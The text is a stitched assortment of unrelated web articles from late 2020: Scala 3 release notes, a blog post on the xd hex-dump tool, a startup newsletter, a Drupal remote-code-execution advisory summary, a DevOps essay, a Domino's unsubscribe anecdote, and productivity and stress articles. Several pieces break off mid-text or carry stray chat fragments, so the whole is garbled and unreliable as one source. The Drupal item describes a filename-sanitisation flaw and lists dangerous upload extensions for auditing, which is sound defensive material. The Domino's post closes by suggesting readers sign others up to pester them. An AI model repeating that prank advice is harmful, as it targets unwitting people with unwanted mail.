<p>Previously, when an enumeration declared cases with value parameters, such as <code>Opt.Sm</code>, then the <code>Opt.values</code> array would no longer have indexes that match the enum case ordinals. We feel that this is problematic, so the <code>values</code> and <code>valueOf</code> methods will only be generated when an enum has exclusively singleton cases.</p>
<p>If an enumeration adds a case with value parameters, then consumers will recieve an error that explains why <code>values</code> has been removed.</p>
<pre><code>scala&gt; Opt.values
1 |Opt.values
  |^^^^^^^^^^
  |value values is not a member of object Opt.
  |Although class Opt is an enum, it has non-singleton cases,
  |meaning a values array is not defined
</code></pre>
<p>For code that previously relied upon <code>values</code> to lookup singleton cases, we now provide an optimised method <code>fromOrdinal</code> that reflects singleton values. This method is always generated:</p>
<pre><code>scala&gt; Opt.fromOrdinal(1)
val res1: Opt[?] = Nn
</code></pre>

<p>Following the discussion on <a href="https://contributors.scala-lang.org/t/the-alpha-notation/4583">contributors</a>, we now keep <code>@alpha</code> optional for operators. The checking behavior is still available when compiling with the <code>-Yrequire-alpha</code>.</p>
<p><code>@alpha</code> annotations provide a way to define an alternate name for symbolic operators. You can learn more about <code>@alpha</code> annotations from the <a href="https://dotty.epfl.ch/docs/reference/changed-features/operators.html#the-alpha-annotation">documentation</a>. The change was implemented by PR <a href="https://github.com/lampepfl/dotty/pull/10093">#10093</a>.</p>

<p>During the last months, a considerable amount of effort went into investigating performance bottlenecks in the compiler and optimizing its workflow. We also work on stabilizing the compiler and porting relevant changes from the Scala 2 compiler to Scala 3. The following PRs are relevant to highlighting this work:</p>
<ul>
<li>Port classfile parsing improvements <a href="https://github.com/lampepfl/dotty/pull/10037">#10037</a></li>
<li>Semanticdb usability enhancements <a href="https://github.com/lampepfl/dotty/pull/9768">#9768</a></li>
<li>Optimize core and frontend <a href="https://github.com/lampepfl/dotty/pull/9867">#9867</a></li>
</ul>

<p>This release of Scala 3 doesn't work on JDK 14 because of a regression fixed in <a href="https://github.com/lampepfl/dotty/pull/10135">#10135</a>. JDK 15 doesn't work either because of <a href="https://github.com/scala/bug/issues/12172">scala/bug#12172</a> which will be fixed in the new scala-library release.</p>

November 20, 2020 | https://www.azabani.com/2020/11/15/xd.html | <a href="https://web.archive.org/web/*/https://www.azabani.com/2020/11/15/xd.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p><a href="https://crates.io/crates/xd">xd(1)</a> is a tool that dumps binary input in a more human-readable format.
There are countless tools that fit this description, including od(1), hexdump(1), xxd(1), and a bunch of Rust crates in the same vein, but this one has a new trick up its sleeve.</p>



<p>A column with printable ASCII bytes shown as exactly that, and everything else as a dot, is such a strong convention that it basically defines the visual identity of hex-dumping tools.
It’s not a bad convention too — the unobtrusive dots for C0 controls and high bytes make ASCII text stand out, as if you had installed strings(1) on your pattern-matching neurons.
But imagine what kinds of patterns you could spot in binary data, if only there was a unique glyph for each of the other 161 possible bytes?</p>

<p>The features released so far are pretty minimal beyond this very idea, but my hope is for xd(1) to eventually join the likes of rg(1) and fd(1) as another product of Rust’s renaissance of best-in-class solutions to CLI problems.</p>

<p>Modern character encodings like UTF-8 won’t work for a bunch of reasons, including the fact that they’re variable-length, which would break the one-to-one relationship between bytes and glyphs that we’re going for.
Many common single-byte character sets like ISO-8859-1 or Windows-1252 won’t either, because they tend to leave 00h–1Fh and 80h–9Fh undefined to accommodate the C0 and C1 controls, which aren’t the simple printable characters we’re after.</p>

<p>I’ll let Raymond take it from here:</p>

<blockquote>
  <p>Is there a code page that matches ASCII for the first 128 values and can round trip arbitrary bytes through Unicode?</p>

  <p>You may find yourself looking for such a code page when you have a chunk of binary data with embedded ASCII text. You want to be able to dig out and even manipulate the ASCII text, and treat the non-ASCII parts as mysterious characters that have no meaning, but you need to be able to convert them back into the original bytes.</p>

  <p>[…]</p>

  <p>Okay, I’ll cut to the chase. The code page I use for this sort of thing is code page 437. Every bytes is defined and maps to a unique Unicode code point, and it agrees with ASCII for the first 128 values.</p>

  
</blockquote>

</figure>

<p>In particular, we use a mapping of code page 437 to Unicode that <em>includes</em> the dingbats and other symbols that lived in the ROM at 01h–1Fh, plus a tweak that replaces U+0000 NULL with U+2400 SYMBOL FOR NULL at 00h.
The end result is a reversible text representation that’s fairly visually distinct<sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p>

delan you still got that hexview program?

[2016-06-19 18:33:35] &lt;delan&gt;
yeah Jaci, I’m still working on it</pre>

<p>This is actually my third attempt at executing this idea in this form<sup id="fnref:2"><a href="#fn:2">2</a></sup>.</p>

<p>I first wrote <a href="https://bitbucket.org/delan/xd/commits/branch/prototype.c">a version of this tool</a> in C, before I even got into Rust, and it was pretty elaborate.
There were <a href="https://bitbucket.org/delan/xd/commits/b01eb4396a235fe6c85d30fc24ca497b60f3018c#Largv.cT10">custom format strings</a> powered by <a href="https://bitbucket.org/delan/xd/commits/b01eb4396a235fe6c85d30fc24ca497b60f3018c#Lcontext.cT72">a nearly-incomprehensible hand-rolled parser</a>, a cute little <code>--help</code> system that would essentially popen(3) a pager like less(1) and <a href="https://bitbucket.org/delan/xd/commits/b01eb4396a235fe6c85d30fc24ca497b60f3018c#Lmain.cT73">pipe documentation text from inside the program</a>, and the project even taught me how to <a href="https://bitbucket.org/delan/xd/commits/41d60216d694de579844b8ba9259834e753693ec">use fuzzing to fix bugs</a>!</p>

<p>A couple of years later, <a href="https://bitbucket.org/delan/xd/commits/branch/prototype.rs">I ported it to Rust</a> as my first foray into the language.
I kept many of the more… useful features (the popen(3)-to-pager trick was more <em>cute</em> than <em>useful</em>), learned to <a href="https://crates.io/crates/nom">use parser combinators</a> with the new <a href="https://bitbucket.org/delan/xd/commits/d804e1cdd0dd5a4a7c5279624c592e3b8d44b4a5#Lsrc/format.rsT138">custom format parser</a>, and wrote enough functionality that I could start <a href="https://bitbucket.org/delan/xd/commits/e387383e193e2afd1a54e8a437cadc57595f0594?at=prototype.rs#Lsrc/options.rsT85">emulating the competition</a>.</p>

<p>The problem was that I hadn’t really <em>released</em> many of my projects before, and I was more than happy to perpetually avoid dealing with <em>that</em> can of worms in favour of using the project as a training ground for learning how to build new things.
Rust certainly helped — unlike C, it has a fantastic <a href="https://doc.rust-lang.org/cargo/">package manager</a> and a <a href="https://crates.io/">place to put your packages</a> — and that’s where <a href="https://crates.io/crates/ing2ynab">almost</a> <a href="https://crates.io/crates/nonymous">everything</a> <a href="https://crates.io/crates/pledge">else</a> I’ve managed to release (or help release) has gone.</p>

<p>But the lesson that really made this project see the light of day?
To build something that has any broader impact, you can’t just experiment forever, rewriting your project over and over (but better this time) and trying to perfect a feature set that will blow everyone out of the water on version zero.</p>

<p>At the end of the day, you’ve got to actually turn it into a thing that’s useful to someone (even just you or your friends), be it a package they can install, <a href="https://charming.daz.cat/">a service</a> they can use, a <a href="https://www.youtube.com/watch?v=hMGM6s1Qw_Q">video</a> and <a href="https://www.azabani.com/2020/06/29/bad-apple-for-taskmgr.html">writeup</a> they can enjoy, or <em>something</em>.
And from there, you can iterate.</p>

Hyper hype VS Hyper growth</h2><p><br>A bit of market frenzy this week and US election conspiracy with the timing of Pfizer and BioNTech announcement of a COVID-19 vaccine. A vaccine that could bank them <a href="https://www.theguardian.com/business/2020/nov/10/pfizer-and-biontech-could-make-13bn-from-coronavirus-vaccine">$13 billion next year</a> and speed of development. The FTSE 100 jumped by 5% whilst Zoom (-15%), Peloton (-7%) and Netflix (-5%) fell. Perhaps more people would still prefer to go back to their Friday night drinks and in-person gym experiences over online <a href="https://www.theverge.com/2020/11/11/21559541/beyonce-peloton-themed-class-music-bike-treadmill-lawsuit-settled">Beyonce X Peloton classes</a>.<br></p><div><p><strong>Hyper hype hype</strong></p><p>On the other side of the market, Supreme was acquired this week for $2.1 billion by <a href="https://www.cnbc.com/2020/11/09/vans-owner-vf-corp-to-buy-streetwear-brand-supreme-for-2point1-billion.html">VF Corp</a>. This brings them into the fold of a company who owns Timberland, The North Face and Vans. They are <a href="https://trapital.co/2020/11/10/memo-014-hip-hops-next-era">a firm with experience</a> in extending the shelf of mass market brands but it is to be seen whether Supreme’s brand will extend well into the mass market. Whilst resale prices may be high for Supreme products on the secondary market, going to the masses can be profitable. Last year when Yeezy began to go to the mass market they saw a <a href="https://footwearnews.com/2019/business/athletic-outdoor/yeezy-mass-release-sales-2019-1202736706/">500% increase in sales</a> and also a $1.3 billion deal with GAP this year. </p></div><div><p>The market continued as a hypebeast continued this week with viral digital products studio MSCHF claiming to raise a seed round of $200 million for <a href="https://techcrunch.com/2020/11/09/mschfs-push-party-raises-an-unconventional-round-at-a-200-million-valuation">PushParty</a>, an app with a FOCUS on doing one thing only. If you press the big red button on the app, you send a notification to everyone with the app installed. Perhaps being a hypebeast can be quite a lucrative career option. MSCHF previously raised $11.5 million and who can forget, Push Pizza, the equally minimalist startup that lets you do only one thing - <a href="https://insights.dice.com/2014/08/08/push-for-pizza-app/">push a button for pizza</a>.</p></div><figure><img src="https://ci3.googleusercontent.com/proxy/XQpNChZzd_phLLy_NgqZNTeyAt7_6ZsK76jKtw5-C4qAcFz2BEMKI2E0zSZVAYoltjqrikDrFui0Ov2Q1OV1HpKeyVYSC_DXfO7oCrHrmIpfUghel-kHqpd3MnMGVOIqxOBWRZ7s2jUB8fpcwKU7_SSgP7mREA=s0-d-e1-ft#https://mcusercontent.com/9c9bf2101972b0a405bd2f81d/images/b40917ab-e8ff-4e6e-8699-aeaf753e0f0d.png" alt=""></figure><div><p><strong>Hyper growth</strong></p><p>Whilst Supreme and MSCHF command the attention of Gen-Z, UK startup Hopin has been facing super <em>hypergrowth</em>. The startup has raised $125 million in a Series B since raising $40 million in a Series A only a few months ago in the summer. Hopin is now at a <a href="https://techcrunch.com/2020/11/10/hopin-raises-125m-for-its-online-events-platform-on-the-back-of-surging-growth/">$2.25 billion valuation</a> whilst having $20million Annual Recurring Revenue (ARR). The startup is only 2 years old. Solo founder Johnny Boufarhat created the startup from a desire to improve the events networking business after falling seriously ill after a food poisoning experience. Johnny shares <a href="https://viralwegrow.com/blog/hopin-johnny-boufarhat/">some of his insights</a> on how he has managed to raise capital as a solo founder and how to manage viral growth.</p></div><p>Hopin’s valuation at 100x its current ARR display some of the investor optimism in having a ‘really good’ <em>product market fit </em>for Software as a Service (SaaS) businesses and an extreme outlier. As a benchmark, slower growing SaaS companies trade at 3-5x next year’s revenue (e.g. Zuora and Dropbox) whilst fast growing ones (and outliers) like Zoom and Datago trade at a valuation that is 40x the ARR.<br></p><figure><img src="https://lh4.googleusercontent.com/uI1EZt26p1urFsssrQWvx2UUvFfxgnuQVL9Lae5dJqTsfUuVoY00a0GbXvLNW_QBJS57zoc6mtft0-ZzqEeBwdhJ0lv-fLq8GCW5isAW_ObudP5LeVxik8g-godRRmgUWOGMO9Gh" alt=""><figcaption>Growth premium in SaaS. <em>Source: SeriouslySaaS</em></figcaption></figure><div><p><strong>Product to Market Hype - Veblen Goods</strong></p><p>What we are seeing in the market with hype products is a phenomenon called a Veblen good. What this means is that unlike consumer interest for traditional goods which falls as price increases, increasing the price for a Veblen product creates an exclusive ‘luxury’ effect that increases demand. In the case of Supreme, there’s a perceived value in the hype for a good whether it be resale values or to own something exclusive. How this works for content or digital media which is less scarce and more infinitely scalable is less certain (although <a href="https://cointelegraph.com/news/tokenized-art-nfts-paint-bright-future-for-artists-blockchain-tech">blockchain firms are trying for digital art</a>). MSCHF is a media based company and it is working for them. </p></div><figure><img src="https://lh4.googleusercontent.com/HFJUMKT8iR-7zDYzXYa0GeAJmTQNwmiPqIYWeNyFXyLcq6LxariReqhP6uynZNKo3dWthnaaDgqwouQu6wjfbEMYkcg7sxHUl9t8wr1V6O_IFg2sbyn6kulBmfErKZJEmhSRvhDv" alt=""><figcaption>Normal Good vs Veblen Good</figcaption></figure><div><p>Perhaps this hype is part of a wider cultural shift of spending patterns. According to Future Cast, Gen Z’s have an <a href="https://www.millennialmarketing.com/research-paper/the-power-of-gen-z-influence/">enormous influence on spend</a>. They spend $44 billion for themselves and influence $600 billion in spending by others. It is well documented that both Gen Z’s and Millenials have a greater weighting on value in paying for <em>experiences</em>. Perhaps being a part of a meme or consuming <em>content as an experience </em>is worth hyping and paying for. </p></div><h2 id="brain-gems">Brain Gems<br></h2><p><a href="https://www.nytimes.com/2020/11/08/business/digital-nomads-regret.html"><strong>The Digital Nomads Did Not Prepare for This</strong></a> (by Erin Griffith)</p><p>Paradise lost.

<p>Drupal, a popular CMS and blogging platform has patched a remote code execution vulnerability, <strong>CVE-2020-13671</strong>.</p>



<p>Today, over half a million sites use Drupal, as such applying updates for critical vulnerabilities like these immediately is vital.</p>



<p>The vulnerability also tracked as <a href="https://www.drupal.org/sa-core-2020-012" target="_blank" rel="noreferrer noopener">SA-CORE-2020-012</a>, exists due to improper validation of filenames of files uploaded to Drupal websites.</p>



<p>A remote attacker can upload files with crafted filenames. Since the vulnerable versions do not properly sanitize these filenames, it is possible to trick the uploader into treating a file as, say, PHP, and have it execute arbitrary code on the server. </p>



<p>“Drupal core does not properly sanitize certain filenames on uploaded files, which can lead to files being interpreted as the incorrect extension and served as the wrong MIME type or executed as PHP for certain hosting configurations,” states Drupal’s security advisory.</p>



<h2>Multiple patched versions released</h2>



<p>Drupal has released patches for multiple versions, depending on what branch you are using:</p>



<ul><li>If you are using Drupal 9.0, update to&nbsp;<a href="https://www.drupal.org/project/drupal/releases/9.0.8">Drupal 9.0.8</a></li><li>If you are using Drupal 8.9, update to&nbsp;<a href="https://www.drupal.org/project/drupal/releases/8.9.9">Drupal 8.9.9</a></li><li>If you are using Drupal 8.8 or earlier, update to&nbsp;<a href="https://www.drupal.org/project/drupal/releases/8.8.11">Drupal 8.8.11</a></li><li>If you are using Drupal 7, update to&nbsp;<a href="https://www.drupal.org/project/drupal/releases/7.74">Drupal 7.74</a></li></ul>



<p>“Versions of Drupal 8 prior to 8.8.x are end-of-life and do not receive security coverage,” states the advisory.</p>



<p>In addition, for due diligence, website admins should check <em>all previously uploaded files</em> for malicious extensions. </p>



<p>The security advisory suggests looking for files with more than one extension, such as <code>filename.php.txt</code> or <code>filename.html.gif</code>.</p>



<p>These files are really PHP or HTML files containing code but have been disguised as text/image files via a misleading file extension.</p>



<p>“Look specifically for files that include more than one extension, like&nbsp;<code>filename.php.txt</code>&nbsp;or&nbsp;<code>filename.html.gif</code>, without an underscore (<code>_</code>) in the extension. Pay specific attention to the following file extensions, which should be considered dangerous even when followed by one or more additional extensions:”</p>



<ul><li>phar</li><li>php</li><li>pl</li><li>py</li><li>cgi</li><li>asp</li><li>js</li><li>html</li><li>htm</li><li>phtml</li></ul>



<p>“This list is not exhaustive, so evaluate security concerns for other unmunged extensions on a case-by-case basis.”</p>



<p>Multiple researchers have been credited for reporting this vulnerability: ufku, Mark Ferree, Frédéric G. Marand, Samuel Mortenson of the Drupal Security Team, and Derek Wright.</p>



<p>Users are advised to upgrade their Drupal instances to the fixed versions as soon as possible. Also, remember to perform additional auditing steps mentioned above to minimize the possibility of a potential security compromise.</p>

<p>I think DevOps, as we understand it today, is coming to an end. At least the Ops part of it. As cloud infrastructure becomes a key application concern, more and more ops tasks are done by the cloud itself or built into the application. What’s left is the provisioning and management of the infrastructure needed by the application. This comes with all the baggage associated, like security and networking, for example.</p>
<p>All of these patterns that are now being forged will make the infrastructure provisioning indistinguishable from the application itself for the general use case. Right now, in most companies, traditional IT Groups have rebranded themselves as DevOps and are now the gatekeepers of AWS, instead of the on-premise VMWare clusters. They use Terraform instead of bash scripts and are generally more agile, having adopted many of the development practices. These are specialized people that are familiar with networking, with how IAM works in AWS. They are responsible for building the networking part, the infrastructure, securing it, and handing it over to the application that uses them.</p>
<p>The developers are mostly fine with it, as they don’t want to learn the intricacies of AWS IAM or VPC’s. I’m reminded in many ways of how the database was treated when I joined the industry in the 2000s. Back then, the application would not touch the structure of the database. You would have scripts that would be run by DBAs on production systems. Those would create the database structure, the tables, indexes, and basically the entire database structure. Developers would then map these to their code and just perform DML once the application was running on a fixed schema that is managed by someone else. I see infrastructure the same way today.</p>
<p>Once ORM and various other frameworks started to manage this domain, these concerns got bundled in the application. There is no reason why the same thing won’t happen to infrastructure. The only problem is we didn’t have the right frameworks to do it, but now we’re starting to get them.</p>
<p>The need to handle application infrastructure (I see this different than managing core business services infrastructure like AD, email, finance systems, etc.) at scale happened in the age of virtualization and started with CFEngine. For those that don’t know, CFEngine was one of the first configuration management systems as we understand it today, followed by Puppet, Chef, and others. CFEngine happened in the age where most provisioned happened either by hand or by following documented step by step instructions. At the core of the proposition was a whitepaper written by Mark Burgess <sup id="fnref:1"><a href="#fn:1">1</a></sup>. The mainline of reasoning was:</p>
<blockquote>
<p>Present day computer systems are fragile and unreliable. Human beings are involved in the care and repair of computer systems at every stage in their operation. This level of human involvement will be impossible to maintain in the future. Biological and social systems of comparable and greater complexity have self-healing processes that are crucial to their survival. It will be necessary to mimic such systems if our future computer systems are to prosper in a complex and hostile environment.</p>
</blockquote>
<p>CFEngine was one of the first cracks of the problem of building a self-healing system that works at scale and shares some of the ideas from the immune system. To achieve this, it leveraged four important properties:
1) It used a DSL to describe the desired state instead of using procedural languages. This would try to abstract components to allow administrators to parameterize and reuse.
2) It has converging semantics, i.e., one describes what a system should look like, and when the system has been brought to that state, CFEngine becomes inert.
4) It offers protection against an unfortunate repetition of tasks and hanging processes in situations where several administrators are working independently with little opportunity to communicate.</p>
<p>Using these features, one could achieve a self-correcting and self-healing system, which would result in a system that maintains fault tolerance. Today with AWS, we can design a system that displays the same properties by leveraging multi-regional services. By their nature, these services can transfer these properties to the application if employed with careful design.</p>
<p>Lots of other tools appeared around the same time or soon after, each focusing on different aspects of the initial value proposition. Probably the most popular are Puppet and Chef. Each has its strong points. At the company I work, we went with Puppet to handle our infrastructure configuration mostly because it was easier to read for non-programers. From a sysadmin perspective, it was appealing to get something done without diving too much into coding. In time, it would prove to be a false choice that would hurt us more than it helped.</p>
<p>Puppet has its own DSL, its own terminology, and idiosyncrasies. It has its own ecosystem of tools, dashboards, and extensions that help you get pretty far in managing your infrastructure. Its strong point is dealing with single server systems that didn’t need distributed coordination between them. There is a way of coordination across several servers with exported resources and PuppetDB, but it always felt hacky to me((it may be a different story today, but I haven’t followed the space for a couple of years now).</p>
<pre><code>
#https://github.com/voxpupuli/puppet-minecraft/blob/master/manifests/user.pp

class minecraft::user {
  group { $minecraft::group:
    ensure =&gt; present,
    system =&gt; true,
  }

  user { $minecraft::user:
    ensure     =&gt; present,
    gid        =&gt; $minecraft::group,
    home       =&gt; $minecraft::install_dir,
    managehome =&gt; true,
    system     =&gt; true,
    require    =&gt; Group[$minecraft::group],
  }

  # Ensures deletion of install_dir does not break module, setup for plugins
  $dirs = [$minecraft::install_dir, "${minecraft::install_dir}/plugins"]

  file { $dirs:
    ensure  =&gt; directory,
    owner   =&gt; $minecraft::user,
    group   =&gt; $minecraft::group,
    require =&gt; User[$minecraft::user],
  }
}
</code></pre>
<p>This worked well and allowed us to build a lot of automation to manage hundreds of servers when dealing with simple infrastructure components. But like most things, it’s the edge cases that make you feel the pain. Since the Puppet language is a DSL, simple problems started to become big problems. Like, not being able to do a proper for-loop. Or doing string manipulation.</p>
<p>Most configuration languages suffer from these problems. In the end, you will also probably get in a situation where you need to extend them to cover a specific use case, and usually, it’s at this point that you will need to write real code. There is only so much you can do without writing in “real” languages, so we should have probably done it from the start. Looking back, probably Chef would have been a much better choice. At least with it, a lot of the things learned there could have been applied to other aspects of my career (Chef uses ruby instead of their own DSL). I don’t have a lot of experience with Ansible or with Salt, but I feel they suffer from the same shortcomings and have similar strong points.</p>
<p>A somewhat distinct category in the configuration language space is Terraform and AWS Cloud Formation. They both borrow from the legacy of configuration management systems and try to sync their internal view of how things should look with reality. The main difference, outside of the way you express intent (which is still using DSL and not full fledge languages), is that they’re designed to work at the cloud provider level.</p>
<p>Just as Puppet and Chef are very good at managing typical resources on a machine (service, package, config file), Terraform and AWS Cloud Formation are very good at managing cloud services. They were built with the notion of cloud infrastructure. This doesn’t mean that you can’t do the same thing with Puppet, Chef, and the rest of the gen2 configuration languages. You can, but due to how fast they adapted to the cloud reality, how they tried to monetize the cloud, and so on, Terraform became the uncontested king of DSL based cloud infrastructure management, while Cloud Formation reigned in AWS land.</p>
<p>All these tools adopted the best parts from CFEngine, the most important being the notion of convergent state. They would take your expressed intent, compare it to the machine, figure out any dependencies and order of steps that will bring the resources to its desired state. They usually also involve a compilation stage where they map the DSL to inner logic and create an execution plan. This would also catch basic mistakes. These are good ideas that have battle-proven and are now the default way of dealing with infrastructure.</p>
<p>As we move forward, however, fundamental shifts are happening in the way we consume and deal with infrastructure components. Now you can leverage AWS services. You can build a very complex application that uses CloudFront for static content distribution, API gateway with Lambda to build API routes and add business functionality to them. Identity management can be handled by Cognito. On the backend, these Lambda functions can interact with an entire ecosystem of infrastructure directly, like RDS or DynamoDB. You can interact with analytics systems via Redshift or display visualized data via QuickSight. Background tasks can be handled by Lambda as well, workflows driven with step functions, async batch, and ETL tasks using AWS EMR or Glue. Composing these to achieve significant business value can be done with relatively little glue code as AWS services are very well integrated together.</p>
<p>New classes of applications are emerging that try to better adapt to this landscape. One example is what AWS labeled as serverless. Provisioning these types of apps using Terraform or Cloud Formation can lead to a lot of friction. In such a tightly integrated model, your infrastructure will evolve with your application, so this probably needs to be one of the most …</p></div></div>

<p>I had a fun little experience over the past few days. Someone had ordered Domino’s in the UK and seemingly typed in my email address by accident. This gave me the privilege of receiving daily emails from Domino’s promoting their latest deal. The first few days it was novel and interesting seeing what was popular across the pond but this morning I decided I might as well unsubscribe.</p>

<amp-img src="/assets/static/images/dominos-pre-vpn.png" alt="Domino's marketing page without VPN" width="1297" height="185" layout="responsive"></amp-img>

<p>Lo and behold the unsubscribe link didn’t work. Rather than a web page I got a friendly server error indicating “Access Denied” and that I did not have permission to access the unsubscribe page. My suspicion that this was a result of Domino’s blocking access to the site turned out to be true since I was able to unsubscribe using a VPN.</p>

<p>What a wild world. Rather than supporting a global unsubscribe Domino’s has a geofenced site for the UK that just blocks access outside the country (just try going to https://www.dominos.co.uk/ outside the UK). I don’t know what sort of anti-spam laws this violates (am I now <a href="https://www.ftc.gov/tips-advice/business-center/guidance/can-spam-act-compliance-guide-business">$43,280</a> richer?) but it’s ridiculous that I was not able to unsubscribe from Domino’s email without resorting to a VPN.</p>

<p>The lesson here is that if you live outside the Uk and want to bother someone - sign them up for an account on the Domino’s UK site.</p>

                <p>Good product managers take the lead in selecting the problems they solve for their team and organization.</p><p>As a young PM, a lot of what you work on will be decided by your manager or other stakeholders. But as you mature in the product management role, you should pro-actively start owning the decision to choose the <em>problems that you work on</em>.</p><p>Last month, I finalized the themes (and problems) that I will focus on in 2021. With every passing year, I try to make better, more logical, more meaningful, and exciting choices. To make this selection process objective, I measure each opportunity against the below.</p><ol><li>Business impact - the higher the better.</li><li>New learning involved - new knowledge is a massive motivation for me.</li><li>Improvement vs innovation - a healthy mix is required. A mix with more emphasis on innovation is more appealing for me.</li><li>Difficulty level - solving difficult problems keeps me on my toes and hence motivated.</li></ol><p>We might not always get to work on what we want, but the goal is to have enough items that meet our criterion and keep us motivated throughout the year.</p>

								<div>
									<ul>
<li><span>“In the nineteen-nineties, the spread of e-mail had transformed knowledge work. With nearly all friction removed from professional communication, anyone could bother anyone else at any time.” — Cal Newport</span></li>
<li><span>Cal references David Allen and his book “</span><a href="https://www.goodreads.com/book/show/1633.Getting_Things_Done?from_search=true&amp;from_srp=true&amp;qid=QHFss5ZqVH&amp;rank=1"><span>Getting Things Done: The Art of Stress-Free Productivity</span></a><span>,” where David talks about a theory on how our minds work that suggests when we try to keep track of obligations in our heads, we create “open loops” that make us anxious.&nbsp;</span>
<ul>
<li><span>“If we could avoid worrying about what we were supposed to be doing, we could focus more fully on what we were actually doing, achieving what Allen called a “mind like water.” — Cal Newport</span></li>
</ul>
</li>
<li><span>Cal also notes the late Peter Drucker (who wrote over 39 books) with how predicted in the mid 1950s how work/productivity would change in the future. “Drucker predicted that corporate profits would depend on mental effort, and that each individual knowledge worker, possessing skills too specialized to be broken down into “repetitive, simple, mechanical motions” choreographed from above, would need to decide how to “apply his knowledge as a professional” and monitor his own productivity.”</span></li>
<li><span>It’s important to not attach your identity to your productivity. Or as Cal mentions, “Productivity, we must recognize, can never be entirely personal. It must be connected to a system that we can study, analyze, and improve.”</span></li>
<li><span>Your days should be structured in such a way that you can spend most of your time focussed on the autonomous, creative, skilled work that Drucker identified as so crucial to growing our economy, Cal adds.</span></li>
<li><span>For teams/companies, Cal asks such a simple question and solution that I think gets glossed over sometimes and especially now that we’re all mostly remote. “What if you began each morning with a status meeting in which your team confronts its task board? A plan could then be made about which handful of things each person would tackle that day. Instead of individuals feeling besieged and resentful—about the additional tasks that similarly overwhelmed colleagues are flinging their way—they could execute a collaborative plan designed to benefit everyone.”</span></li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>I’ve always felt that my productivity has never been top-notch-allstar-level quality. However, my only comparison is my perceived productivity of other people. Those same people, I have no clue whether or not they are struggling just as much as me or if they have a team of help. Productivity is such a weird, but cool space. The humanness of it is very real. </span></p>

<p><span>We all carry an anecdote to share about how stress is affecting our sleep patterns, making us feel irritable, moody or even neglected at times. But, apart from all these oddities we face day in and day out, do you know how stress has been slowly eating away your brain?&nbsp;&nbsp;</span></p>
<p><span>Stress happens to all of us, but it isn’t <a href="https://news.berkeley.edu/2013/04/16/researchers-find-out-why-some-stress-is-good-for-you/" target="_blank" rel="noopener noreferrer">always that bad</a>. For example, a wee bit of stress can give you a motivation to present a compelling speech at a public event, or help you focus while playing a competitive sport.&nbsp;</span></p>

<p><span>There is also this other kind of stress, a bad one, that sustains over a length of time called chronic stress. This type hammers you daily, and eventuates when you’re in situations like having a heated argument with our closed ones, when you overwork or when you’re at risk of losing your job.&nbsp;</span></p>
<p><span>This low-key stress can trigger the release of all sorts of hormones that can wreak havoc on our physiological functioning. They can give you racing heart, shallow breathing, muscle tension&nbsp; and even slow down the digestive process.</span></p>
<p><span>In fact, these physiological responses are actually part of our survival mechanism called the <a href="https://www.psychologytools.com/resource/fight-or-flight-response/" target="_blank" rel="noopener noreferrer">‘fight or flight’ response</a> (also known as the acute stress response) that lets us decide whether we stay and deal with a dangerous situation or to run away to safety. However, when the stress gets chronic and our immune system activates this response too often, it takes its toll on us.&nbsp;</span></p>
<h3><strong>How Stress Affects The Brain</strong></h3>
<p><span>Chronic stress affects the overall structure of the brain, including size, and its functionality. The damage is discernible right down to the level of genes.&nbsp;</span></p>
<p><span>Stress originates from the <a href="https://en.wikipedia.org/wiki/Hypothalamic%E2%80%93pituitary%E2%80%93adrenal_axis" target="_blank" rel="noopener noreferrer">hypothalamic pituitary adrenal</a> (HPA) axis. The HPA axis is our central stress response unit slathered with a series of intertwined channels that connect the brain and the endocrine system.&nbsp;</span></p>
<p><span>During a stressful situation, the brain signals our HPA axis <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4263906/" target="_blank" rel="noopener noreferrer">to release a hormone called cortisol</a>, which procures glucose and fatty acids from the liver to prime your body with the energy required to face challenges lying ahead.</span></p>
<p><span>However, if the HPA axis keeps secreting cortisol for an extended period, the elevated levels of cortisol can inflict damage to your brain.&nbsp;</span></p>
<p><span>For example, when you’re under stress, the activity and synaptic connections in the amygdala, the part of the brain that induces aggression or fear, increase. And as the levels of cortisol continue to rise, the electrical rhythms in the hippocampus, the part of the brain’s limbic system associated with emotion, learning, memories formation, and stress control, get disturbed which in turn deteriorate its performance.</span></p>
<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->


<p><span>The hippocampus also suppresses the activity of the HPA axis. Enfeeblement of the HPA axis would lead to your ability to cope with stress being compromised. Furthermore, surge in cortisol levels can cause your brain to literally shrink in size as a result of loss of synapses between neurons; it can also cause your <a href="https://www.thescienceofpsychotherapy.com/prefrontal-cortex/" target="_blank" rel="noopener noreferrer">prefrontal cortex&nbsp; (or PFC)</a> to shrink.&nbsp;</span></p>
<p><span>The prefrontal cortex covers the front part of the brain. This region of the brain has been implicated in making executive functions, which include things like concentration, self-control, decision-making, social interaction and problem-solving.&nbsp;</span></p>
<p><span>Shrinkage in the prefrontal cortex means </span><span>you won’t be as proficient in carrying out certain tasks as you were. </span><span>The damage doesn’t end here, though. Chronically high levels of cortisol have also been shown to slow down the process of neurogenesis – making of new neurons – in the hippocampus.&nbsp;</span></p>
<p><span>So it’s evident that if fewer cells are being made in the hippocampus, you would be going through a rough patch trying to learn new skills or remember things. Also, even worse, chronic stress has been shown to accelerate the onset of serious mental disorders like depression, Alzheimer’s and other related forms of dementia.&nbsp;</span></p>
<h3><strong>The Effect of Stress On Your Genes</strong></h3>
<p><span>The effects of stress </span><span>go right down to the brain’s DNA. Or, let’s say </span><span>– your childhood experiences, or how you were raised – can influence changes in your brains down to the level of genetics.&nbsp;</span></p>
<p><span>A <a href="https://www.salk.edu/news-release/early-developmental-experiences-influence-dna-in-the-adult-brain/" target="_blank" rel="noopener noreferrer">study at Salk Institute for Biological Studies</a> in 2018 showed that the amount of care a mouse pup receives from its mother plays a substantial role on how effectively the pup copes with stress later in adulthood.&nbsp;&nbsp;</span></p>
<p><span>The offspring of more-attentive mice grew up to be calm adults because their brains developed more cortisol receptors, hence were less sensitive to stressful situations. And the pups raised by less-attentive mice grew up to be more sensitive to stress throughout life.</span></p>
<p><span>This dissimilarity in offspring raised by different mothers is not at all genetics, it’s epigenetics, meaning no change in genetic code is involved although the upbringing alters the way <a href="https://sparkonit.com/2018/03/10/genes-express-themselves/" target="_blank" rel="noopener noreferrer">the genes are expressed</a>.</span></p>
